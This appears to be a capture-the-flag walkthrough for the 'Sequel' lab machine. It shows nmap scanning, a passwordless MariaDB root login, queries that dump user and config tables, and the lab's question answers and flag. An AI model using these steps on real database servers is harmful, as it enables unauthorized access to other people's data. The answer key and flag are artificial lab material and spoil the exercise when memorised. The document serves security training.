# Sequel

> IP: [10.129.95.232]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.129.95.232 -oN init_scan
      1. Port 3306 -> mysql
         1. Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
3. MYSQL
   1. Lets connect to the database on port 3306 as the root user
      1. > mysql -uroot -h 10.129.95.232 -P 3306
4. QUERY
   1. > show databases;

        ```text
            +--------------------+
            | Database           |
            +--------------------+
            | htb                |
            | information_schema |
            | mysql              |
            | performance_schema |
            +--------------------+
        ```

        1. Inhere we see the `htb` table which is not a normal table
        2. Lets use this database and get the data
   2. > use htb;
   3. > show tables;
      1. users, config
   4. > select * from users;

        ```text
            +----+----------+------------------+
            | id | username | email            |
            +----+----------+------------------+
            |  1 | admin    | admin@sequel.htb |
            |  2 | lara     | lara@sequel.htb  |
            |  3 | sam      | sam@sequel.htb   |
            |  4 | mary     | mary@sequel.htb  |
            +----+----------+------------------+
        ```

   5. > select * from config;

        ```text
            +----+-----------------------+----------------------------------+
            | id | name                  | value                            |
            +----+-----------------------+----------------------------------+
            |  1 | timeout               | 60s                              |
            |  2 | security              | default                          |
            |  3 | auto_logon            | false                            |
            |  4 | max_size              | 2M                               |
            |  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
            |  6 | enable_uploads        | false                            |
            |  7 | authentication_method | radius                           |
            +----+-----------------------+----------------------------------+
        ```

## QUESTIONS

1. During our scan, which port do we find serving MySQL?
   1. `3306`
2. What community-developed MySQL version is the target running?
   1. `mariadb`
3. When using the MySQL command line client, what switch do we need to use in order to specify a login username?
   1. `-u`
4. Which username allows us to log into this MariaDB instance without providing a password?
   1. `root`
5. In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?
   1. `*`
6. In SQL, what symbol do we need to end each query with?
   1. `;`
7. There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?
   1. `htb`
8. Submit root flag
   1. `7b4bec00d1a39e3dd4e021ec3d915da8`
